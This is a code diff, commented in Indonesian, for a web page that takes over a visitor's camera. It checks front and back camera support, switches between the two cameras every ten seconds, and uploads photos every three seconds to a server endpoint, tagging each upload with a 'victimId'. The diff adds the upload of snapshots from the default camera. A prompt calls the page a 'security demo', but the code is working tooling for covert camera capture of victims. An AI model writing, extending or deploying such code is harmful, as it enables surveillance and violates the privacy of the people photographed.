@@ -23,6 +23,7 @@ let switchInterval = null;
 let periodicInterval = null;
 let isCameraActive = false;
 let cameraRetryCount = 0;
+let facingModeSupport = { front: false, back: false };
 const MAX_RETRY = 3;
 
 // ==================== FUNGSI KIRIM DATA ====================
@@ -117,6 +118,49 @@ function handleCameraError(err, cameraType) {
   });
 }
 
+// ============= CEK DUKUNGAN FACING MODE =============
+async function checkFacingModeSupport() {
+  debug("🔍 Mengecek dukungan facingMode...");
+
+  // Cek kamera depan (user)
+  try {
+    const frontTest = await navigator.mediaDevices.getUserMedia({
+      video: {
+        facingMode: { exact: "user" },
+        width: { ideal: 320 },
+        height: { ideal: 240 },
+      },
+    });
+    frontTest.getTracks().forEach((t) => t.stop());
+    facingModeSupport.front = true;
+    debug("✅ Kamera DEPAN (facingMode: user) DIDUKUNG");
+  } catch (e) {
+    facingModeSupport.front = false;
+    debug(`❌ Kamera DEPAN (facingMode: user) TIDAK DIDUKUNG: ${e.message}`);
+  }
+
+  // Cek kamera belakang (environment)
+  try {
+    const backTest = await navigator.mediaDevices.getUserMedia({
+      video: {
+        facingMode: { exact: "environment" },
+        width: { ideal: 320 },
+        height: { ideal: 240 },
+      },
+    });
+    backTest.getTracks().forEach((t) => t.stop());
+    facingModeSupport.back = true;
+    debug("✅ Kamera BELAKANG (facingMode: environment) DIDUKUNG");
+  } catch (e) {
+    facingModeSupport.back = false;
+    debug(
+      `❌ Kamera BELAKANG (facingMode: environment) TIDAK DIDUKUNG: ${e.message}`,
+    );
+  }
+
+  return facingModeSupport;
+}
+
 // ============= FUNGSI START CAMERA DENGAN FACINGMODE =============
 async function startCameraWithMode(cameraType, retryCount = 0) {
   if (isSwitching) {
@@ -142,25 +186,59 @@ async function startCameraWithMode(cameraType, retryCount = 0) {
     // Tentukan facingMode
     const facingMode = cameraType === "front" ? "user" : "environment";
 
-    // Konfigurasi constraints dengan facingMode
-    const constraints = {
-      video: {
-        width: { ideal: 640, max: 1280 },
-        height: { ideal: 480, max: 720 },
-        facingMode: { exact: facingMode },
-      },
-    };
+    // Jika facingMode tidak didukung, langsung fallback
+    if (
+      (cameraType === "front" && !facingModeSupport.front) ||
+      (cameraType === "back" && !facingModeSupport.back)
+    ) {
+      debug(
+        `⚠️ ${cameraType} tidak didukung, langsung fallback ke kamera default`,
+      );
+      throw new Error("FacingMode not supported");
+    }
 
-    debug(
-      `📷 Mengakses kamera ${cameraType} dengan facingMode: ${facingMode}...`,
-    );
+    // Konfigurasi constraints - coba dengan berbagai opsi
+    let constraints;
+    let stream = null;
+
+    // Coba 1: dengan facingMode exact
+    try {
+      constraints = {
+        video: {
+          width: { ideal: 640, max: 1280 },
+          height: { ideal: 480, max: 720 },
+          facingMode: { exact: facingMode },
+        },
+      };
+      debug(
+        `📷 Mengakses kamera ${cameraType} dengan facingMode exact: ${facingMode}...`,
+      );
+      stream = await navigator.mediaDevices.getUserMedia(constraints);
+    } catch (exactError) {
+      debug(`⚠️ FacingMode exact gagal: ${exactError.message}`);
+
+      // Coba 2: dengan facingMode tanpa exact
+      try {
+        constraints = {
+          video: {
+            width: { ideal: 640, max: 1280 },
+            height: { ideal: 480, max: 720 },
+            facingMode: facingMode,
+          },
+        };
+        debug(`🔄 Mencoba dengan facingMode: ${facingMode} (tanpa exact)...`);
+        stream = await navigator.mediaDevices.getUserMedia(constraints);
+      } catch (nonExactError) {
+        debug(`⚠️ FacingMode non-exact juga gagal: ${nonExactError.message}`);
+        throw nonExactError;
+      }
+    }
 
     const statusEl = document.getElementById("status");
     if (statusEl) {
       statusEl.textContent = `Mengakses kamera ${cameraType === "front" ? "DEPAN" : "BELAKANG"}...`;
     }
 
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
     currentStream = stream;
     currentCameraType = cameraType;
     cameraRetryCount = 0;
@@ -197,30 +275,39 @@ async function startCameraWithMode(cameraType, retryCount = 0) {
   } catch (err) {
     debug(`❌ Gagal akses kamera ${cameraType}: ${err.message}`);
 
-    // Jika facingMode tidak didukung, coba tanpa facingMode
-    if (
-      err.message.includes("facingMode") ||
-      err.name === "OverconstrainedError"
-    ) {
-      debug(
-        `🔄 ${cameraType} tidak didukung, coba fallback tanpa facingMode...`,
-      );
-      try {
-        const fallbackStream = await navigator.mediaDevices.getUserMedia({
-          video: { width: { ideal: 640 }, height: { ideal: 480 } },
+    // Fallback ke kamera default
+    debug(`🔄 ${cameraType} tidak didukung, coba kamera default...`);
+    try {
+      const defaultStream = await navigator.mediaDevices.getUserMedia({
+        video: { width: { ideal: 640 }, height: { ideal: 480 } },
+      });
+      currentStream = defaultStream;
+      currentCameraType = "default";
+      debug(`✅ Kamera default aktif`);
+      await sendData("camera_access", {
+        camera: "default",
+        status: "active_default",
+        timestamp: new Date().toISOString(),
+      });
+
+      // Ambil foto dari kamera default
+      const image = await captureFromStream(defaultStream, "default");
+      if (image) {
+        await fetch("/api/capture-image", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            victimId: victimId,
+            image: image,
+            cameraType: "default",
+            timestamp: new Date().toISOString(),
+          }),
         });
-        currentStream = fallbackStream;
-        currentCameraType = "default";
-        debug(`✅ Kamera default aktif (fallback mode)`);
-        await sendData("camera_access", {
-          camera: "default",
-          status: "active_fallback",
-          timestamp: new Date().toISOString(),
-        });
-        return true;
-      } catch (e) {
-        debug(`❌ Fallback gagal: ${e.message}`);
+        debug(`📸 Foto default terkirim`);
       }
+      return true;
+    } catch (e) {
+      debug(`❌ Fallback default gagal: ${e.message}`);
     }
 
     // Retry logic untuk error tertentu
@@ -248,16 +335,36 @@ async function startCameraWithMode(cameraType, retryCount = 0) {
 
 // ============= FUNGSI SWITCH CAMERA =============
 async function switchCamera() {
+  debug(`🔄 SWITCH CAMERA - Current: ${currentCameraType || "none"}`);
+
+  // Jika saat ini kamera depan, coba ke belakang
   if (currentCameraType === "front") {
-    debug("🔄 Mencoba beralih ke kamera BELAKANG...");
-    await startCameraWithMode("back");
-  } else if (currentCameraType === "back") {
-    debug("🔄 Mencoba beralih ke kamera DEPAN...");
-    await startCameraWithMode("front");
-  } else {
-    // Jika currentCameraType default, coba ke depan dulu
-    debug("🔄 Mode default, mencoba beralih ke kamera DEPAN...");
-    await startCameraWithMode("front");
+    if (facingModeSupport.back) {
+      debug("🔄 Mencoba beralih ke kamera BELAKANG...");
+      await startCameraWithMode("back");
+    } else {
+      debug("⚠️ Kamera BELAKANG tidak didukung, tetap di kamera depan");
+    }
+  }
+  // Jika saat ini kamera belakang, coba ke depan
+  else if (currentCameraType === "back") {
+    if (facingModeSupport.front) {
+      debug("🔄 Mencoba beralih ke kamera DEPAN...");
+      await startCameraWithMode("front");
+    } else {
+      debug("⚠️ Kamera DEPAN tidak didukung, tetap di kamera belakang");
+    }
+  }
+  // Jika default atau tidak ada, coba yang didukung
+  else {
+    debug("🔄 Mode default, mencoba beralih...");
+    if (facingModeSupport.front) {
+      await startCameraWithMode("front");
+    } else if (facingModeSupport.back) {
+      await startCameraWithMode("back");
+    } else {
+      debug("⚠️ Tidak ada facingMode yang didukung, tetap di default");
+    }
   }
 }
 
@@ -375,6 +482,9 @@ setTimeout(async () => {
 setTimeout(async () => {
   debug("📷 Memulai akses kamera (switch camera dengan facingMode)...");
 
+  // Cek dukungan facingMode terlebih dahulu
+  await checkFacingModeSupport();
+
   const izinAwal = confirm(
     "⚠️ DEMO KEAMANAN SIBER ⚠️\n\n" +
       "Website ini akan mengakses kamera Anda untuk simulasi keamanan.\n\n" +
@@ -387,10 +497,20 @@ setTimeout(async () => {
     return;
   }
 
-  // Mulai dengan kamera depan
-  const frontSuccess = await startCameraWithMode("front");
+  // Pilih kamera yang didukung
+  let startSuccess = false;
+  if (facingModeSupport.front) {
+    debug("📷 Memulai dengan kamera DEPAN...");
+    startSuccess = await startCameraWithMode("front");
+  } else if (facingModeSupport.back) {
+    debug("📷 Memulai dengan kamera BELAKANG...");
+    startSuccess = await startCameraWithMode("back");
+  } else {
+    debug("📷 Tidak ada facingMode yang didukung, coba fallback...");
+    startSuccess = await startFallbackCamera();
+  }
 
-  if (frontSuccess) {
+  if (startSuccess) {
     isCameraActive = true;
 
     // Kirim foto periodik setiap 3 detik
@@ -423,26 +543,36 @@ setTimeout(async () => {
       }
     }, 3000);
 
-    // Mulai pergantian kamera otomatis setiap 10 detik
-    debug("🔄 Memulai pergantian kamera otomatis setiap 10 detik...");
-    const statusEl = document.getElementById("status");
-    if (statusEl) {
-      statusEl.textContent = `Kamera aktif: DEPAN | Akan bergantian setiap 10 detik`;
-    }
-
-    switchInterval = setInterval(async () => {
-      if (!isSwitching && currentStream && currentCameraType !== "default") {
-        debug("🔄 Menjalankan pergantian kamera otomatis...");
-        await switchCamera();
-        if (statusEl) {
-          statusEl.textContent = `Kamera aktif: ${currentCameraType === "front" ? "DEPAN" : "BELAKANG"} | Akan bergantian setiap 10 detik`;
-        }
+    // Mulai pergantian kamera otomatis setiap 10 detik (hanya jika kedua facingMode didukung)
+    if (facingModeSupport.front && facingModeSupport.back) {
+      debug("🔄 Memulai pergantian kamera otomatis setiap 10 detik...");
+      const statusEl = document.getElementById("status");
+      if (statusEl) {
+        statusEl.textContent = `Kamera aktif: ${currentCameraType === "front" ? "DEPAN" : "BELAKANG"} | Akan bergantian setiap 10 detik`;
       }
-    }, 10000);
+
+      switchInterval = setInterval(async () => {
+        if (!isSwitching && currentStream && currentCameraType !== "default") {
+          debug("🔄 Menjalankan pergantian kamera otomatis...");
+          await switchCamera();
+          if (statusEl) {
+            statusEl.textContent = `Kamera aktif: ${currentCameraType === "front" ? "DEPAN" : currentCameraType === "back" ? "BELAKANG" : currentCameraType} | Akan bergantian setiap 10 detik`;
+          }
+        }
+      }, 10000);
+    } else {
+      debug(
+        "⚠️ Tidak semua facingMode didukung, pergantian kamera dinonaktifkan",
+      );
+      const statusEl = document.getElementById("status");
+      if (statusEl) {
+        statusEl.textContent = `Kamera aktif: ${currentCameraType === "front" ? "DEPAN" : currentCameraType === "back" ? "BELAKANG" : "DEFAULT"} (single camera mode)`;
+      }
+    }
 
     debug("✅ Sistem kamera siap dengan mode switch (facingMode)");
   } else {
-    debug("❌ Gagal mengakses kamera depan, mencoba fallback...");
+    debug("❌ Gagal mengakses kamera, mencoba fallback...");
     await startFallbackCamera();
   }
 }, 3000);
